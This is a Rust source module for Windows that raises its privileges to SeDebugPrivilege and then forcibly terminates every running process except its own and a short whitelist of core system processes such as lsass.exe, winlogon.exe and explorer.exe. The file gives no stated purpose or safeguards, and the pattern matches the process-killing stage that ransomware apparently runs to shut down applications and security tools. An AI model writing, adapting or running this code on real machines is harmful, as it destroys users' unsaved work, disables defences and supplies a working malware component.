use std::mem::size_of;
use std::process::id;
use std::ptr::null_mut;

use winapi::shared::minwindef::{DWORD, HMODULE, MAX_PATH};
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
use winapi::um::psapi::{EnumProcesses, EnumProcessModulesEx, GetModuleBaseNameW, LIST_MODULES_ALL};
use winapi::um::winnt::{HANDLE, PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE, PROCESS_VM_READ};

// https://github.com/KernelPan1k/adjust-privilege-rs
use crate::privilege::adjust_privilege;

fn get_process_ids() -> Option<Vec<u32>> {
    let buffer_size: usize = 1024;
    let buffer_len: DWORD = 1024;
    let mut cb_needed: DWORD = 0;
    let mut a_process: Vec<u32> = Vec::with_capacity(buffer_size);

    let enum_status: i32 = unsafe {
        a_process.set_len(buffer_size);

        EnumProcesses(
            a_process.as_mut_ptr(),
            buffer_len,
            &mut cb_needed,
        )
    };

    if enum_status == 0 {
        return None;
    }

    let c_process: u32 = cb_needed / size_of::<DWORD>() as u32;

    if c_process < buffer_len {
        unsafe { a_process.set_len(c_process as usize) }
    }

    Some(a_process)
}

fn get_handle(pid: &u32) -> Option<HANDLE> {
    let desired_access: u32 = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE;

    let handle: HANDLE = unsafe {
        OpenProcess(
            desired_access,
            0,
            pid.to_owned(),
        )
    };

    if handle.is_null() {
        return None;
    }

    Some(handle)
}

fn get_process_name(handle: HANDLE) -> Option<String> {
    let mut process_name = [0u16; MAX_PATH + 1];
    let mut h_mod: HMODULE = null_mut();
    let mut cb_needed: u32 = 0;

    let enum_status: i32 = unsafe {
        EnumProcessModulesEx(
            handle,
            &mut h_mod,
            size_of::<DWORD>() as DWORD,
            &mut cb_needed,
            LIST_MODULES_ALL,
        )
    };

    if enum_status == 0 {
        return None;
    }

    unsafe {
        GetModuleBaseNameW(
            handle,
            h_mod as _,
            process_name.as_mut_ptr(),
            MAX_PATH as DWORD + 1,
        );
    }

    let mut pos = 0;

    for z in process_name.iter() {
        if *z == 0 {
            break;
        }

        pos += 1;
    }

    let the_process_name: String = String::from_utf16_lossy(&process_name[..pos]);

    Some(the_process_name)
}

pub fn kill_process() {
    // https://github.com/KernelPan1k/adjust-privilege-rs
    adjust_privilege("SeDebugPrivilege");

    let keep_process: [&str; 11] = [
        "lsass.exe",
        "csrss.exe",
        "conhost.exe",
        "smss.exe",
        "winlogon.exe",
        "services.exe",
        "wininit.exe",
        "wlms.exe",
        "lsm.exe",
        "svchost.exe",
        "explorer.exe",
    ];

    let current_pid: u32 = id();
    let process_ids: Vec<u32> = get_process_ids().unwrap();

    for pid in process_ids {
        if pid == current_pid {
            continue;
        }

        let handle: HANDLE = match get_handle(&pid) {
            Some(h) => h,
            None => continue,
        };

        let process_name: String = match get_process_name(handle) {
            Some(s) => s,
            None => {
                unsafe { CloseHandle(handle); }
                continue;
            }
        };

        let process_name: String = process_name.to_lowercase();

        if false == keep_process.iter().any(|k| k == &process_name) {
            unsafe { TerminateProcess(handle, 0); }
        }

        unsafe { CloseHandle(handle); }
    }
}